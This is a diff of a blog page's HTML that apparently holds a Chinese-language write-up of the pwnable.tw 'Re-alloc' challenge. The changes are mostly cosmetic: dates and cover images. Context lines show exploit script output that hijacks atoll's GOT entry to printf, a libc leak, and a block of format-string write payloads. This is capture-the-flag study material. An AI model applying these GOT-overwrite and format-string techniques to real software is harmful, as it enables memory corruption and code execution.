@@ -37,7 +37,7 @@
 <meta property="og:image" content="http://example.com/2024/09/23/Pwnable-realloc/a.png">
 <meta property="og:image" content="http://example.com/2024/09/23/Pwnable-realloc/b.png">
 <meta property="article:published_time" content="2024-09-23T10:27:21.000Z">
-<meta property="article:modified_time" content="2024-09-23T10:31:34.680Z">
+<meta property="article:modified_time" content="2025-01-20T06:20:37.778Z">
 <meta property="article:author" content="Naup堇姬">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2024/09/23/Pwnable-realloc/a.png">
@@ -160,12 +160,8 @@
 </div>
 <header id="header">
   
-    <picture>
-      
-    </picture>
-    
-      <img fetchpriority="high" src="/images/banner.webp" alt="Pwnable.tw-Re-alloc">
-    
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/Pwnabletw/pwnabletw.webp" alt="Pwnable.tw-Re-alloc">
   
   <div id="header-outer">
     <div id="header-title">
@@ -284,7 +280,7 @@
       <div class="article-date">
   <a href="/2024/09/23/Pwnable-realloc/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2024-09-23T10:27:21.000Z" itemprop="datePublished">2024-09-23</time>
-    <time style="display: none;" id="post-update-time">2024-09-23</time>
+    <time style="display: none;" id="post-update-time">2025-01-20</time>
   </a>
 </div>
 
@@ -354,7 +350,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/pwn/pwnable/realloc$ python3 exploit.py </span><br><span class="line">local?(y/n):y</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./realloc&#x27;</span>: pid <span class="number">4533</span></span><br><span class="line"><span class="built_in">open</span> debug?(y/n/srop)n</span><br><span class="line">attach?(y/n)n</span><br><span class="line">NAUPINFO @ atoll GOT: <span class="number">0x404048</span></span><br><span class="line">NAUPINFO @ printf_PLT: <span class="number">0x401070</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊      RE Allocator      🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   <span class="number">1.</span> Alloc               $</span><br><span class="line">$   <span class="number">2.</span> Realloc             $</span><br><span class="line">$   <span class="number">3.</span> Free                $</span><br><span class="line">$   <span class="number">4.</span> Exit                $</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice: $ <span class="number">3</span></span><br><span class="line">Index:$ %p</span><br><span class="line"><span class="number">0x7ffd2d731480</span></span><br></pre></td></tr></table></figure>
 
 <p>libc位於rsp+0x18</p>
-<div class="img-item" data-src="/2024/09/23/Pwnable-realloc/a.png" data-sub-html=".caption"><img src="/2024/09/23/Pwnable-realloc/a.png" class=""></div>
+<img src="/2024/09/23/Pwnable-realloc/a.png" class="">
 
 <p>用 %9$p</p>
 <p>leak成功</p>
@@ -363,7 +359,7 @@
 <p>結果我打到這裡就卡住了<br>因為我把atoll改成printf，導致我function不能用</p>
 <p>後來看到printf回傳值是印出的字元數，所以可以控回傳<br><a target="_blank" rel="noopener" href="https://kknews.cc/zh-tw/tech/gvv9mp9.html">https://kknews.cc/zh-tw/tech/gvv9mp9.html</a><br>用 <code>%xxxc\x00</code>的方式</p>
 <p>然而當我嘗試排了許多次heap，heap arr[1]卡著一塊GOT address，所以我想利用手上有的fmt，寫掉heap arr，但是輸入長度只有0x10，所以我想到可以用stack上value來寫heap addr做寫入</p>
-<div class="img-item" data-src="/2024/09/23/Pwnable-realloc/b.png" data-sub-html=".caption"><img src="/2024/09/23/Pwnable-realloc/b.png" class=""></div>
+<img src="/2024/09/23/Pwnable-realloc/b.png" class="">
 
 <p>先寫入4bytes的heap arr再stack上，並且用fmt蓋0去蓋掉低位byte<br>我一次蓋2bytes，再去修改stack 上 heap arr address(這邊只蓋低位1bytes就行了)，address+0x2蓋掉heap arr<br>以此類推<br>最後把heap arr 0跟1都蓋成0</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%4210872c%46$n</span><br><span class="line">%65536c%47$hn</span><br><span class="line"></span><br><span class="line">%186c%46$hhn</span><br><span class="line">%65536c%47$hn</span><br><span class="line"></span><br><span class="line">%176c%46$hhn</span><br><span class="line">%65536c%47$hn</span><br><span class="line"></span><br><span class="line">%178c%46$hhn</span><br><span class="line">%65536c%47$hn</span><br></pre></td></tr></table></figure>
@@ -397,10 +393,7 @@
     
       <div class="article-nav-link-wrap article-nav-link-left">
         
-          
-          
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="Pwnable.tw-Dubblesort" class="lazyload">
-          
+          <img data-src="/images/posts_cover/Pwnabletw/pwnabletw.webp" data-sizes="auto" alt="Pwnable.tw-Dubblesort" class="lazyload">
         
         <a href="/2024/09/23/Pwnable-dubble/"></a>
         <div class="article-nav-caption">Newer</div>
@@ -414,10 +407,7 @@
     
     <div class="article-nav-link-wrap article-nav-link-right">
       
-        
-        
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="Pwnable.tw-secret garden" class="lazyload">
-        
+        <img data-src="/images/posts_cover/Pwnabletw/pwnabletw.webp" data-sizes="auto" alt="Pwnable.tw-secret garden" class="lazyload">
       
       <a href="/2024/09/21/Pwnable-secretgarden/"></a>
       <div class="article-nav-caption">Older</div>
@@ -646,8 +636,8 @@
           description: "",
           stripContent: "Pwnable.tw-Re-alloc Author: 堇姬Naup  env他的版本是 Ubuntu GLIBC 2.29-0ubuntu2glibc all in one載下 libc跟ld 1./download_old 2.29-0ubuntu2_amd64  用 patchelf 來patch 123456patchelf --set-interpreter ld-2.29.so reallocpatchelf --replace-needed libc.so.6 ./libc-2.2",
           date: "Mon Sep 23 2024 18:27:21 GMT+0800",
-          updated: "Mon Sep 23 2024 18:31:34 GMT+0800",
-          cover: "/images/banner.webp",
+          updated: "Mon Jan 20 2025 14:20:37 GMT+0800",
+          cover: "/images/posts_cover/Pwnabletw/pwnabletw.webp",
         };
       </script>
        
